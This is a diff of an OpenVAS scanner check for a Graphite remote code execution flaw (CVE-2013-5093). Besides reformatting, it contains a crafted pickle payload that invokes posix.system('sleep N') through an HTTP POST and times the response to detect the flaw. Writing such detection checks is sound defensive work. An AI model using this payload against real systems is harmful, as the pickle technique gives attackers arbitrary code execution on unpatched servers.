@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_graphite_61894.nasl 8654 2018-02-05 08:19:22Z cfischer $
+# $Id: gb_graphite_61894.nasl 11007 2018-08-16 13:20:25Z mmartin $
 #
 # Graphite Remote Code Execution Vulnerability
 #
@@ -25,58 +25,45 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successfully exploiting this issue will allow attackers to execute
-arbitrary code within the context of the application.
-Impact Level: Application";
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103774";
-
-tag_insight = "In graphite-web 0.9.5, a 'clustering' feature was introduced to
-allow for scaling for a graphite setup. This was achieved by passing pickles
-between servers. However due to no explicit safety measures having been 
-implemented to limit the types of objects that can be unpickled, this creates
-a condition where arbitrary code can be executed";
-
-
-tag_affected = "Graphite versions 0.9.5 through 0.9.10 are vulnerable.";
-tag_summary = "Graphite is prone to a remote code-execution vulnerability.";
-tag_solution = "Ask the Vendor for an update.";
-
-tag_vuldetect = "Try to execute the 'sleep' command by sending a special crafted HTTP
-request and check how long the response take.";
-
 if (description)
 {
- script_oid(SCRIPT_OID);
- script_bugtraq_id(61894);
- script_cve_id("CVE-2013-5093");
- script_tag(name:"cvss_base", value:"6.8");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
- script_version ("$Revision: 8654 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.103774");
+  script_bugtraq_id(61894);
+  script_cve_id("CVE-2013-5093");
+  script_tag(name:"cvss_base", value:"6.8");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
+  script_version("$Revision: 11007 $");
 
- script_name("Graphite Remote Code Execution Vulnerability");
+  script_name("Graphite Remote Code Execution Vulnerability");
 
 
- script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61894");
- 
- script_tag(name:"last_modification", value:"$Date: 2018-02-05 09:19:22 +0100 (Mon, 05 Feb 2018) $");
- script_tag(name:"creation_date", value:"2013-08-22 17:46:22 +0200 (Thu, 22 Aug 2013)");
- script_tag(name:"qod_type", value:"remote_analysis");
- script_tag(name:"solution_type", value: "VendorFix");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61894");
 
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-16 15:20:25 +0200 (Thu, 16 Aug 2018) $");
+  script_tag(name:"creation_date", value:"2013-08-22 17:46:22 +0200 (Thu, 22 Aug 2013)");
+  script_tag(name:"qod_type", value:"remote_analysis");
+  script_tag(name:"solution_type", value:"VendorFix");
 
- script_tag(name : "impact" , value : tag_impact);
- script_tag(name : "vuldetect" , value : tag_vuldetect);
- script_tag(name : "insight" , value : tag_insight);
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- script_tag(name : "affected" , value : tag_affected);
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+
+  script_tag(name:"impact", value:"Successfully exploiting this issue will allow attackers to execute
+arbitrary code within the context of the application.
+Impact Level: Application");
+  script_tag(name:"vuldetect", value:"Try to execute the 'sleep' command by sending a special crafted HTTP
+request and check how long the response take.");
+  script_tag(name:"insight", value:"In graphite-web 0.9.5, a 'clustering' feature was introduced to
+allow for scaling for a graphite setup. This was achieved by passing pickles
+between servers. However due to no explicit safety measures having been
+implemented to limit the types of objects that can be unpickled, this creates
+a condition where arbitrary code can be executed");
+  script_tag(name:"solution", value:"Ask the Vendor for an update.");
+  script_tag(name:"summary", value:"Graphite is prone to a remote code-execution vulnerability.");
+  script_tag(name:"affected", value:"Graphite versions 0.9.5 through 0.9.10 are vulnerable.");
 
  exit(0);
 }
@@ -102,22 +89,22 @@ foreach i (sleep) {
 
   postData = 'line\ncposix\nsystem\np1\n(S\'sleep ' + i + '\'\np2\ntp3\nRp4\n.';
 
-  req = 'POST ' + url + ' HTTP/1.1\r\n' + 
+  req = 'POST ' + url + ' HTTP/1.1\r\n' +
         'Host: ' + host  + '\r\n' +
-        'Content-Type: application/x-www-form-urlencoded\r\n' + 
-        'Connection: close\r\n' + 
-        'Content-Length: ' + strlen(postData) + '\r\n' + 
-        '\r\n' + 
+        'Content-Type: application/x-www-form-urlencoded\r\n' +
+        'Connection: close\r\n' +
+        'Content-Length: ' + strlen(postData) + '\r\n' +
+        '\r\n' +
         postData;
 
 
-  start = unixtime();     
+  start = unixtime();
   result = http_send_recv(port:port, data:req, bodyonly:FALSE);
   stop = unixtime();
 
   if(stop - start < i || stop - start > (i+5))exit(0);
 
-}  
+}
 
 security_message(port:port);
 exit(0);
